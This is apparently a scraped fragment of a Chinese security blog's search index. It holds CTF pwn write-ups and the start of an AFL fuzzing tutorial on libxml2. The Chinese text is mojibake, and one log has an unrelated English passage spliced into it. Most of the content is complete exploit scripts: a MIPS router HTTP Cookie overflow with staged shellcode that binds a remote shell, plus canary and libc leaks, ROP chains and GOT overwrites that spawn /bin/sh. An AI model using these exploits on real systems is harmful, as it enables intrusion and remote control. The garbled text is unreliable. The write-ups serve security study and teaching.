stage1è€ƒè™‘æ„é€ &lt;code&gt;read&lt;/code&gt;ç»•è¿‡ï¼Œ&lt;code&gt;read(socketfd,buf,size)&lt;/code&gt;&lt;br&gt;
&lt;code&gt;shellcraft&lt;/code&gt;ä¸­çš„&lt;code&gt;findpeer&lt;/code&gt;å¯ä»¥ç›´æ¥å°†&lt;code&gt;socketfd&lt;/code&gt;å­˜å…¥&lt;code&gt;$s0&lt;/code&gt;ä¸­&lt;br&gt;
stage2è¯»å…¥åå¼¹shellçš„shellcodeï¼Œè¿™é‡Œæ–¹æ³•ä¸å”¯ä¸€ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº&lt;br&gt;
&lt;code&gt;bindsh&lt;/code&gt; &amp;amp; &lt;code&gt;connect+dupsh&lt;/code&gt; &amp;amp; &lt;code&gt;findpeersh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(arch=&#39;mips&#39;, endian=&#39;big&#39;, os=&#39;linux&#39;)

nop = asm(&#39;addiu $a0, $a0, 0x4141&#39;)
avoid = string.ascii_lowercase.encode() + b&amp;quot;\x00&amp;quot;
addr = 0x7c7ffa90

# sh = listen(1440)
io = remote(&#39;192.168.0.1&#39;, 80)

# stage 1
# find peer socketfd and save it to $s0
sc = asm(shellcraft.findpeer(io.lport))
# read sc2 to addr
sc += asm(shellcraft.read(&#39;$s0&#39;, addr, 0x200))
sc += asm(f&#39;&#39;&#39;
    lui $t9, {addr &amp;gt;&amp;gt; 16}
    ori $t9, $t9, {addr &amp;amp; 0xffff}
    jalr $t9
    addiu $a0, $a0, 0x4141
&#39;&#39;&#39;)

print(&amp;quot;sc::&amp;quot;, sc)


assert all(c not in avoid for c in sc)


payload = b&amp;quot;A&amp;quot;*0x10+p32(addr)+nop*100+sc

request = b&amp;quot;GET /loginFs/passwd HTTP/1.1\r\n&amp;quot;
request += b&amp;quot;Host: 192.168.0.1\r\n&amp;quot;
request += b&amp;quot;Referer: http://192.168.0.1/\r\n&amp;quot;
request += b&amp;quot;Cookie: &amp;quot;+payload+b&amp;quot;\r\n&amp;quot;
request += b&amp;quot;Upgrade-Insecure-Requests: 1\r\n&amp;quot;
request += b&amp;quot;\r\n&amp;quot;

io.send(request)

pause()

# stage 2
# sc2 = asm(shellcraft.findpeersh(io.lport))
# sc2 = asm(shellcraft.connect(&amp;quot;192.168.0.2&amp;quot;, 1440))+asm(shellcraft.dupsh())
sc2 = asm(shellcraft.bindsh(1440))

io.send(sc2)

io.interactive()

# sh.wait_for_connection()
# sh.interactive()
log.progress(&amp;quot;connecting to shell&amp;quot;)
sh1 = remote(&amp;quot;192.168.0.1&amp;quot;, 1440)
sh1.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dam_add1&#34;&gt;dam_add1:&lt;/h3&gt;
&lt;p&gt;ä¸»å‡½æ•°whileå¾ªç¯ï¼Œè¾“å…¥å­—æ¯è§¦å‘&lt;code&gt;stoi&lt;/code&gt;å¼‚å¸¸å¤„ç†é€€å‡ºå¾ªç¯ï¼Œè¦†ç›–&lt;code&gt;rbp&lt;/code&gt;ä¸ºå¯å†™åœ°å€ï¼Œ&lt;code&gt;ret&lt;/code&gt;ä¸º&lt;code&gt;landingpad+1&lt;/code&gt;&lt;br&gt;
å¯»æ‰¾&lt;code&gt;landingpad&lt;/code&gt;ä¸€èˆ¬æ–¹æ³•:&lt;br&gt;
Look around in &lt;code&gt;libstdc++&lt;/code&gt; for a &lt;code&gt;catch&lt;/code&gt; block that just ignores the exception and returns from its function: &lt;a href=&#34;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&#34;&gt;https://github.com/gcc-mirror/gcc/blob/4b8e7b57d952a1031b0fe11533ef76b9821432c0/libstdc%2B%2B-v3/src/c%2B%2B98/ios_init.cc#L144&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A good way to narrow down the search space is to search for references to &lt;code&gt;__cxa_end_catch&lt;/code&gt;, which is called by &lt;code&gt;catch&lt;/code&gt; blocks that do not rethrow the exception.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./add1&amp;quot;)
elf = ELF(&amp;quot;./add1&amp;quot;)
libc = elf.libc


def add(cc):
    io.sendlineafter(b&amp;quot;Enter a number: &amp;quot;, cc)

# gdb.attach(io, &#39;b *0x555555569db7&#39;)
# gdb.attach(io)
# pause()


# leak canary
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x18)
canary = u64(io.recv(7).rjust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))

# leak libc_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x37)
libc_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x29d90
log.success(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

# leak elf_base
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x47)
elf_base = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;)) - 0x157a5
log.success(&amp;quot;elf_base: &amp;quot;+hex(elf_base))

# leak stack_addr
payload = b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57
add(payload)
io.recvuntil(b&amp;quot;0&amp;quot;+b&amp;quot;a&amp;quot;*0x57)
stack_addr = u64(io.recvuntil(b&amp;quot; &amp;quot;, drop=True).ljust(8, b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


ogg = libc_base+0xebc88
target = elf_base + 0x000b3ed4
pop_rsi = libc_base+0x000000000002be51
pop_rdx_r12 = libc_base+0x000000000011f2e7
landingpad = elf_base + 0x17731

# 0x55555556acb7 &amp;lt;__cxa_throw+55&amp;gt;    call   _Unwind_RaiseException@plt                &amp;lt;_Unwind_RaiseException@plt&amp;gt;
# gdb.attach(io, &#39;b *$rebase(0x16cb7)&#39;)
gdb.attach(io)

payload = cyclic(0x30)+p64(stack_addr) + \
    p64(landingpad+1)+p64(0xdeadbeef)+p64(pop_rdx_r12) + \
    p64(0)*2+p64(pop_rsi)+p64(0)+p64(ogg)
print(f&amp;quot;offset:{cyclic_find(0x6161616461616163)}&amp;quot;)  # offset: 8

add(payload)

io.interactive()

# 0x50a47 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_exception&#34;&gt;das_exception:&lt;/h3&gt;
&lt;p&gt;åŠ«æŒmainè¿”å›åœ°å€ï¼Œæ­£å¸¸æ ˆå›é€€å¯ä»¥getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./exception&amp;quot;)
# io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 27319)
elf = ELF(&amp;quot;./exception&amp;quot;)
libc = elf.libc


io.sendafter(b&amp;quot;name\n&amp;quot;, b&amp;quot;%7$p.%9$p.%11$p.&amp;quot;)
canary = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)
base_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x1480
leak_addr = int(io.recvuntil(b&amp;quot;.&amp;quot;, drop=True), 16)-0x24083
log.success(&amp;quot;canary: &amp;quot;+hex(canary))
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

io.recvuntil(b&amp;quot;stack\n&amp;quot;)
stack_addr = int(io.recvuntil(b&amp;quot;\n&amp;quot;, drop=True), 16)
log.success(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

gdb.attach(io, &#39;b *0x7ffff7ddb093&#39;)

ogg = leak_addr+0xe3afe
pop_rdi = leak_addr+0x0000000000023b6a
pop_r12 = leak_addr+0x00000000001143a1
str_sh = leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr = leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload = b&amp;quot;a&amp;quot;*0x68+p64(canary) + \
    p64(stack_addr+0xa0)+p64(base_addr+0x1408) + \
    p64(canary)*5+p64(pop_r12)+p64(0)+p64(ogg)

# payload = b&amp;quot;aaaaaaaa&amp;quot;

io.sendafter(b&amp;quot;exception?\n&amp;quot;, payload)

io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plaid_valor-not&#34;&gt;plaid_valor-not:&lt;/h3&gt;
&lt;p&gt;off-by-one+oobï¼Œç›´æ¥çœ‹æºç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./valor-not&amp;quot;)
io = remote(&amp;quot;valornt.chal.pwni.ng&amp;quot;, 1337)
elf = ELF(&amp;quot;./valor-not&amp;quot;)


def conf():
    # io.sendlineafter(b&amp;quot;n): &amp;quot;, b&amp;quot;y&amp;quot;)
    io.sendline(b&amp;quot;y&amp;quot;)


# gdb.attach(io)
# pause()
# bypass cheater_checker
io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x50+b&amp;quot;cheater&amp;quot;)
conf()
io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64+p64(1))

# padding
for i in range(6):
    io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
    conf()

    io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;s&amp;quot;*0x1+b&amp;quot;heck&amp;quot;)

# bypass enemy_team check
io.sendlineafter(b&amp;quot;offs? \n&amp;quot;, b&amp;quot;y&amp;quot;)
io.sendline(b&amp;quot;heck&amp;quot;+b&amp;quot;a&amp;quot;*0x5c)
# conf()
# io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_control&#34;&gt;das_control:&lt;/h3&gt;
&lt;p&gt;vulnä¸­æº¢å‡ºæŠ›å‡ºå¼‚å¸¸,è¦†ç›–&lt;code&gt;rbp&lt;/code&gt;ä¸º&lt;code&gt;gift&lt;/code&gt;ï¼Œä¹‹åæ‰“æ ˆè¿ç§»&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./control&amp;quot;)
io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 26788)
elf = ELF(&amp;quot;./control&amp;quot;)
libc = elf.libc

pop_rax = 0x0000000000462c27  # pop rax; ret;
syscall_ret = 0x000000000042f494  # syscall; ret;
pop_rdi = 0x0000000000401c72  # pop rdi; ret;
pop_rsi = 0x0000000000405285  # pop rsi; ret;
pop_rdx = 0x0000000000401aff  # pop rdx; ret;
read_text = 0x402221
# 0x000000000045baa3: mov rdx, qword ptr [rsi + 6]; mov qword ptr [rdi], rcx; mov qword ptr [rdi + 6], rdx; ret;
magic_gadget = 0x000000000045baa3
# vuln =

io.sendafter(b&amp;quot;Gift&amp;gt; &amp;quot;, p64(magic_gadget)+p64(read_text))

# gdb.attach(io, &#39;b *0x000000000045baa3\nset follow-fork-mode parent\n&#39;)

payload = cyclic(0x70)+p64(0x4D3348)+p64(0x04021fa+1)
io.sendafter(b&amp;quot;control?\n&amp;quot;, payload)

payload = b&amp;quot;/bin/sh\x00&amp;quot;+p64(pop_rdi)+p64(0x4d3350)+p64(pop_rdx) + \
    p64(0)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)
io.sendafter(b&amp;quot;again&amp;quot;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;d3note&#34;&gt;d3note:&lt;/h3&gt;
&lt;p&gt;è¶Šç•Œè¯»å†™æ”¹gotè¡¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc


def op114(c1, c2, cc):  # malloc
    io.sendline(str(0x114))
    io.sendline(str(c1))
    io.sendline(str(c2))
    io.sendline(cc)


def op514(c1):  # puts
    io.sendline(str(0x514))
    io.sendline(str(c1))


def op1919(c1):  # free
    io.sendline(str(0x1919))
    io.sendline(str(c1))


def op810(c1, cc):  # edit
    io.sendline(str(0x810))
    io.sendline(str(c1))
    io.sendline(cc)

# pause()


op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)
op1919(0)
op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)

op514(-0x39f)
leak_addr = u64(io.recv(6).ljust(8, b&#39;\x00&#39;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
log.success(f&amp;quot;leak_addr: {hex(leak_addr)}&amp;quot;)

sys_addr = leak_addr + libc.sym[b&amp;quot;system&amp;quot;]

gdb.attach(io)

op114(-0xa, sys_addr &amp;amp; 0xffffffff, b&amp;quot;a&amp;quot;)
op1919(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">è¿‘æœŸä¸€äº›é¢˜</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VX0_6BnfV/"" data-c="
          &lt;h2 id=&#34;libxml2&#34;&gt;libxml2ï¼š&lt;/h2&gt;
&lt;h3 id=&#34;å‰è¨€&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
&lt;p&gt;æœ¬æ–‡è®°å½•afl-trainingçš„ç¬¬ä¸€ç¯‡ï¼Œå¤ç°&lt;code&gt;CVE-2015-7497&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;å‡†å¤‡å·¥ä½œ&#34;&gt;å‡†å¤‡å·¥ä½œï¼š&lt;/h3&gt;
&lt;p&gt;æŒ‰ç…§å®˜æ–¹æ“ä½œ,æœ¬æœºä¸‹é¢éœ€è¦è®¾ç½®ä¸‹ä¸´æ—¶ç¯å¢ƒå˜é‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git submodule init &amp;amp;&amp;amp; git submodule update
cd libxml2
export CC=afl-clang-fast 
./autogen.sh 
export AFL_USE_ASAN=1 
make -j 4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨äº†&lt;code&gt;ASAN&lt;/code&gt;ï¼Œå³&lt;code&gt;address sanitizer&lt;/code&gt;ï¼Œä¸€ä¸ªå¿«é€Ÿçš„å†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œå¯ä»¥åœ¨å†…å­˜åˆ†é…å¤±è´¥æ—¶ç«‹å³é€€å‡ºå¹¶æ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œä½†æœ‰çš„æƒ…å†µä¸‹å†…å­˜åˆ†é…å¤±è´¥å¹¶ä¸ä¼šå¯¼è‡´ç¨‹åºå´©æºƒ&lt;br&gt;
ä¸ºäº†æ–¹ä¾¿åé¢fuzzåå¤„ç†crashï¼Œæˆ‘ä»¬å¯ä»¥å¼€å¯&lt;code&gt;ASAN&lt;/code&gt;å¹¶è®¾ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡ç¦ç”¨&lt;code&gt;export ASAN_OPTIONS=detect_leaks=0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ä¸è¿‡å¼€å¯&lt;code&gt;ASAN&lt;/code&gt;ä¹‹åç¼–è¯‘çš„æµ‹è¯•ç¨‹åº&lt;code&gt;./testModule&lt;/code&gt;è¿è¡Œæ—¶æŠ¥é”™&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/libxml2/libxml2# ./testModule 
[-] FATAL: forkserver is already up, but an instrumented dlopen() library loaded afterwards. You must AFL_PRELOAD such libraries to be able to fuzz them or LD_PRELOAD to run outside of afl-fuzz.
To ignore this set AFL_IGNORE_PROBLEMS=1 but this will lead to ambiguous coverage data.
In addition, you can set AFL_IGNORE_PROBLEMS_COVERAGE=1 to ignore the additional coverage instead  is going to be easy to
fuzz, is definitely exposed to user-provided input in many situations, and is at high risk of containing bugs (parsing a
complex data format in an unsafe language).

This functionality is exposed in the [parser](http://xmlsoft.org/html/libxml-parser.html) API, and whilst you could dig
through this documentation, the easiest approach is to look at an example.
[`parse1.c`](http://xmlsoft.org/examples/parse1.c) (also in the (use with caution!).
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ‰äººæè¿‡ç±»ä¼¼çš„issue &lt;a href=&#34;https://coder.social/antonio-morales/fuzzing101/issues/21&#34;&gt;https://coder.social/antonio-morales/fuzzing101/issues/21&lt;/a&gt;&lt;br&gt;
è¿½æº¯åˆ°å®˜æ–¹FAQæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯è®¾ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_PRELOAD=foo.so
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½†æ˜¯ç¬”è€…è®¾ç½®ä¹‹åä»ç„¶æŠ¥é”™ï¼Œä¸”åœ¨æœ¬æœºæ£€ç´¢åå¹¶æœªæ‰¾åˆ°&lt;code&gt;foo.so&lt;/code&gt;&lt;br&gt;
(&lt;code&gt;foo.so&lt;/code&gt;å…¶å®å¹¶ä¸æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œ&lt;code&gt;foo&lt;/code&gt;çš„æœ¬æ„å°±æ˜¯æ— æ„ä¹‰ï¼Œå¾—straceé™„åŠ è¿›ç¨‹ä¸Šçœ‹ç›¸å…³çš„åŠ¨æ€é“¾æ¥åº“&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒç§è®¾ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡å¿½ç•¥åæµ‹è¯•æˆåŠŸ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_IGNORE_PROBLEMS=1 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç¼–å†™harness&#34;&gt;ç¼–å†™harnessï¼š&lt;/h3&gt;
&lt;p&gt;ä»¥ä¸Šæˆ‘ä»¬å¹¶æœªç”Ÿæˆfuzzæ‰€éœ€çš„å…¥å£ç¨‹åºï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£æ‰€è¯´ï¼Œå³æ˜¯æˆ‘ä»¬éœ€è¦ä¸€ä¸ª&lt;code&gt;fuzzing harness&lt;/code&gt;ï¼Œç¬”è€…ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ï¼Œæ‰€ä»¥è·Ÿç€å®˜æ–¹æ–‡æ¡£çš„hintèµ°äº†&lt;br&gt;
æ ¹æ®å®˜æ–¹æ–‡æ¡£æè¿°&lt;code&gt;libxml2&lt;/code&gt;çš„apiå¾ˆå¤šï¼Œä½†æ˜¯æœ€å®¹æ˜“è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ˜¯æ ¸å¿ƒXMLè§£æé€»è¾‘ï¼Œå› ä¸ºå®ƒæš´éœ²åœ¨&lt;code&gt;ç”¨æˆ·è¾“å…¥&lt;/code&gt;çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½åœ¨å¤„ç†ä¸å®‰å…¨çš„å¤æ‚æ•°æ®æ—¶å‡ºç°bug&lt;br&gt;
æ ¹æ®å®˜æ–¹ç»™çš„example&lt;a href=&#34;http://xmlsoft.org/examples/parse1.c&#34;&gt;http://xmlsoft.org/examples/parse1.c&lt;/a&gt;å¯ä»¥è‡ªå·±å¤§æ¦‚æ”¹ä¸€ä¸ªï¼Œä»å‘½ä»¤è¡Œè¯»å…¥æ–‡ä»¶åçš„harness&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */

    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ç¼–è¯‘&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast ./fuzz.c -I ./include ./.libs/libxml2.a -lz -lm -g -o fuzzer 

#-I æŒ‡å®šincludeç›®å½•å’Œlibxml2çš„é™æ€é“¾æ¥åº“
#-lmä½¿ç”¨mathåº“ï¼Œ-lzä½¿ç”¨zlibåº“ï¼Œ-gå¼€å¯debugæ¨¡å¼

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŠ¥é”™&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[-] PROGRAM ABORT : Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!
         Location : check_asan_opts(), src/afl-fuzz-init.c:2651
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥è¯¢ç›¸å…³issue:&lt;a href=&#34;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&#34;&gt;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&lt;/a&gt;&lt;br&gt;
å†æ¬¡è®¾ç½®ç¯å¢ƒå˜é‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export ASAN_OPTIONS=abort_on_error=1:symbolize=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æ­£å¸¸fuzz&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223602862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä¼˜åŒ–harness&#34;&gt;ä¼˜åŒ–harnessï¼š&lt;/h3&gt;
&lt;p&gt;ä½†æ˜¯å¤ªæ…¢äº†ï¼Œæˆ‘ä»¬æ ¹æ®afl++æ–‡æ¡£å¯ä»¥æ·»åŠ ä¸€ç‚¹ä¼˜åŒ–&lt;br&gt;
æ³¨æ„ä¸å¿…è¦è¯­å¥çš„åˆ é™¤ï¼Œä¸‹é¢æ˜¯å¤±è´¥ç¤ºä¾‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while(__AFL_LOOP(1000)){
    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸç¤ºä¾‹ï¼Œæ³¨æ„ä¸¤è€…åŒºåˆ«ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv)
{
    if (argc != 2)
        return (1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while (__AFL_LOOP(1000))
    {
        doc = xmlReadFile(argv[1], NULL, 0);
        if (doc != NULL)
        {
            xmlFreeDoc(doc);
        }
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return (0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åæ•ˆç‡æå‡æœ€é«˜30x&lt;/p&gt;
&lt;h3 id=&#34;crashåˆ†æ&#34;&gt;crashåˆ†æï¼š&lt;/h3&gt;
&lt;p&gt;4ä¸ªå°æ—¶8ä¸ªunique crash&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223609962.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;afl-tmin&lt;/code&gt;ç²¾ç®€input:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*; do afl-tmin -i $i -o ./tmp/$i -m none -- ./fuzzer @@; done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;../fuzzer è¾“å…¥æ–‡ä»¶&lt;/code&gt;æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æœ‰å‡ ä¸ªè¾“å…¥æ–‡ä»¶é”™è¯¯å‘ç”Ÿåœ¨&lt;code&gt;parser.c&lt;/code&gt;çš„ç¬¬10666è¡Œï¼Œå³é”™è¯¯å‘ç”Ÿåœ¨å®&lt;code&gt;MOVETO_ENDTAG();&lt;/code&gt;ä¸­ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦å¤ç°çš„&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223617986.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
